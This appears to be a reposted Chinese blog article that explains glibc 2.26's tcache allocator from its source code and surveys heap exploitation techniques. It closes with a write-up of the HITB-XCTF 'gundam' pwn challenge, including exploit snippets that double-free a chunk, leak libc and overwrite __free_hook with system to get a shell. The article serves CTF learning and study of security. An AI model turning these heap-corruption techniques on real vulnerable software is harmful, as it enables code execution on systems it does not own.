<!--yml
category: 未分类
date: 2022-04-26 14:42:29
-->

# 由一道CTF pwn题深入理解libc2.26中的tcache机制_weixin_30363981的博客-CSDN博客

> 来源：[https://blog.csdn.net/weixin_30363981/article/details/98363347](https://blog.csdn.net/weixin_30363981/article/details/98363347)

本文首发安全客：[https://www.anquanke.com/post/id/104760](https://www.anquanke.com/post/id/104760)

在刚结束的HITB-XCTF有一道pwn题gundam使用了2.26版本的libc.因为2.26版本中加入了一些新的机制，自己一开始没有找到利用方式，后来经大佬提醒，才明白2.26版本中新加了一种名叫tcache(thread local caching)的缓存机制。

本文将依据[2.26源码](https://ftp.gnu.org/gnu/libc/glibc-2.26.tar.gz)探讨tcache机制详细情况并结合HITB-XCTF的gundam一题进行实战讲解。题目[下载地址](https://github.com/moonAgirl/CTF/tree/master/2018/Hitbxctf/gundam)。

# Tcache机制

## Tcache介绍

它被集成到了libc2.26中，它对每个线程增加一个bin缓存，这样能显著地提高性能，默认情况下，每个线程有64个bins，以16(8)递增，mensize从24(12)到1032(516)：

```
#if USE_TCACHE
/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */
# define TCACHE_MAX_BINS        64
# define MAX_TCACHE_SIZE    tidx2usize (TCACHE_MAX_BINS-1)
/* Only used to pre-fill the tunables.  */
# define tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)
/* When "x" is from chunksize().  */
# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)
/* When "x" is a user-provided size.  */
# define usize2tidx(x) csize2tidx (request2size (x))
/* With rounding and alignment, the bins are...
   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)
   idx 1   bytes 25..40 or 13..20
   idx 2   bytes 41..56 or 21..28
   etc.  */
/* This is another arbitrary limit, which tunables can change.  Each
   tcache bin will hold at most this number of chunks.  */
# define TCACHE_FILL_COUNT 7
#endif
```

有2个新的感兴趣的结构，tcache_entry和tcache_perthread_struct。两者都很简单，请参阅下面的内容。每个bin是单链表结构，单个tcache bins默认最多包含7个块。

```
/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;
/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct").  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
static __thread tcache_perthread_struct *tcache = NULL;
```

## Tcache使用

### chunk进入tcache的情形

1.释放时，_int_free中在检查了size合法后，放入fastbin之前，它先尝试将其放入tcache

```
#if USE_TCACHE
  {
size_t tc_idx = csize2tidx (size);
if (tcache
    && tc_idx < mp_.tcache_bins //大小合适
    && tcache->counts[tc_idx] < mp_.tcache_count)   //未满
  {
    tcache_put (p, tc_idx);
    return;
  }
  }
#endif
static void tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;  //和fastbin一样，单链表FILO
  ++(tcache->counts[tc_idx]);
}
```

2.在_int_malloc中，若fastbins中取出块则将对应bin中其余chunk填入tcache对应项直到填满（smallbins中也是如此）：

```
 if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
{
  idx = fastbin_index (nb);
  mfastbinptr *fb = &fastbin (av, idx);
  mchunkptr pp = *fb;
  REMOVE_FB (fb, victim, pp);
  if (victim != 0)
{
  if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
{
  errstr = "malloc(): memory corruption (fast)";
errout:
  malloc_printerr (check_action, errstr, chunk2mem (victim), av);
  return NULL;
}
  check_remalloced_chunk (av, victim, nb);
#if USE_TCACHE
      /* While we're here, if we see other chunks of the same size,
     stash them in the tcache.  */
      size_t tc_idx = csize2tidx (nb);
      if (tcache && tc_idx < mp_.tcache_bins)
    {
      mchunkptr tc_victim;
      /* While bin not empty and tcache not full, copy chunks over.  */
      while (tcache->counts[tc_idx] < mp_.tcache_count
         && (pp = *fb) != NULL)
        {
          REMOVE_FB (fb, tc_victim, pp);
          if (tc_victim != 0)
        {
          tcache_put (tc_victim, tc_idx);
    }
        }
    }
#endif
  void *p = chunk2mem (victim);
  alloc_perturb (p, bytes);
  return p;
}
}
```

3.当进入unsorted bin(同时发生堆块合并）中找到精确的大小时，并不是直接返回而是先加入tcache中，直到填满：

```
while(遍历unsorted bin){
....
//当精确匹配
  if (size == nb)
{
  set_inuse_bit_at_offset (victim, size);
  if (av != &main_arena)
        set_non_main_arena (victim);
#if USE_TCACHE
      /* Fill cache first, return to user only if cache fills.
         We may return one of these chunks later.  */
      if (tcache_nb
          && tcache->counts[tc_idx] < mp_.tcache_count)
        {
          tcache_put (victim, tc_idx);
          return_cached = 1;
          continue;
        }
      else
        {
#endif//满了才直接返回
  check_malloced_chunk (av, victim, nb);
  void *p = chunk2mem (victim);
  alloc_perturb (p, bytes);
  return p;
#if USE_TCACHE
        }
#endif
  }
}
```

### 从tcache获取chunk的情形

1.在__libc_malloc，_int_malloc之前，如果tcache中存在满足申请需求大小的块，就从对应的tcache中返回chunk

```
void * __libc_malloc (size_t bytes)
{
  mstate ar_ptr;
  void *victim;
  //hook();
#if USE_TCACHE
  /* int_free also calls request2size, be careful to not pad twice.  */
  size_t tbytes = request2size (bytes);
  size_t tc_idx = csize2tidx (tbytes);
  MAYBE_INIT_TCACHE ();
  DIAG_PUSH_NEEDS_COMMENT;
  if (tc_idx < mp_.tcache_bins  //对应大小的tcache中还有未返回的chunk
  /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */
  && tcache
  && tcache->entries[tc_idx] != NULL)
{
  return tcache_get (tc_idx);
}
  DIAG_POP_NEEDS_COMMENT;
#endif
  arena_get (ar_ptr, bytes);
  victim = _int_malloc (ar_ptr, bytes);
```

2.在遍历完unsorted bin(同时发生堆块合并）之后，若是tcache中有对应大小chunk则取出并返回：

```
 while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
  {
//遍历~~~~~
  }
#if USE_TCACHE
  /* If all the small chunks we found ended up cached, return one now.  */
  if (return_cached)
    {
      return tcache_get (tc_idx);
    }
#endif
```

3.在遍历unsorted bin时，大小不匹配的chunk将会被放入对应的bins，若达到tcache_unsorted_limit限制且之前已经存入过chunk则在此时取出（默认无限制）：

```
 while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
  {
//遍历~~~~~
//大小不等时，放入对应bin~
#if USE_TCACHE
  /* If we've processed as many chunks as we're allowed while
     filling the cache, return one of the cached ones.  */
  ++tcache_unsorted_count;
  if (return_cached
      && mp_.tcache_unsorted_limit > 0
      && tcache_unsorted_count > mp_.tcache_unsorted_limit)
    {
      return tcache_get (tc_idx);
    }
#endif
#define MAX_ITERS   10000
  if (++iters >= MAX_ITERS)
break;
}
```

### 对旧的利用技术的影响

由上可知malloc会优先考虑tcache，在使用它之前只有size等很少的完整性校验(只有存入前有size >= MINSIZE && aligned_OK (size) && !misaligned_chunk (p) && (uintptr_t) p <= (uintptr_t) -size)，而它本身并没有什么完整性校验，于是利用它进行攻击会简单很多。

1.The House of Spirit

在之前，这种利用手段主要用在fastbin，因为它的检查要少很多，包括要释放的chunk大小正确且属于fastbin，下一个chunk大小要适中，不能小于2*SIZE_SZ且不能大于已分配内存。small的检查更多。

但是若使用tcache，就只需要关心当前chunk的地址及大小，chunk大小也不仅仅是fastbin了。

2.double free

和fastbin一样，通过free同一个chunk造成loop bin，但是fastbin不能连续释放同一个chunk，而tcache没有这种限制让它适用更大的chunk。

3.Overlapping chunks

若能更改指定chunk的size，增加其值，那么在释放后进入tcache再分配更改后的对应大小就能控制其后的chunk了。

4.tcache poisoning

对于已经在tcache里面的chunk，更改它的fd值即可在malloc时分配任意地址！

5.Smallbin cache filling bck write

在unsorted bin的unlink中，它回到了最原始的unlink，未进行其他检查(如bck->fd != victim)，这样又可以进行DWORD SHOOT啦：

```
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
```

tcache原理及利用凡是介绍完毕，下面我们就gundam一题进行实用tcache漏洞利用

# gundam题解

程序功能如下：

```
 1 . Build a gundam
 2 . Visit gundams
 3 . Destory a gundam
 4 . Blow up the factory
 5 . Exit
```

Build:申请一块0x28大小的chunk用来存储gundam的结构，再申请一块0x300大小的chunk作为gundam的name，用户输入name的内容

Visit：打印gundam的name及类型

Destory：free指定gundam的name.没有清空指针，可多次free同一块name chunk.

Blowup:将所有gundam释放，没有释放其中的name

```
思路是利用Destory将同一块0x300大小的chunkfree两次进入tcache,再改写它的fd域，name就可以返回任意地址
```

首先泄露libc地址

```
destory(0) #0x300 tcache
destory(0)  #double free  #0x300 tcache

build(p64(heap_libc),1) #4
build('a',1) #5
build('a',1) #6 point to heap_libc

data=visit()
t2=data.index("[6] :")+5
libc=u64(data[t2:t2+6]+'\x00\x00')
```

再将free_hook改写为system

```
destory(1)
destory(1)

build(p64(free_hook),1)#0
build('/bin/sh',1)#1
build(p64(system),1)#2
```

最后调用free函数就相当于调用system函数了，实现get shell

```
destory(0,False)
```

完整脚本[在此](https://github.com/moonAgirl/CTF/tree/master/2018/Hitbxctf/gundam)

# 总结

Tcache是glibc malloc的一个有趣的补充，可提供很明显的性能优势。但是，对于内存分配的安全状态，似乎还有一些倒退的迹象，使得安全性变得极低。这种矛盾表明在性能和安全性之间取得良好的平衡是很困难。对于我们CTFer来说，这倒是一个好消息。

```
参考：http://tukan.farm/2017/07/08/tcache/
```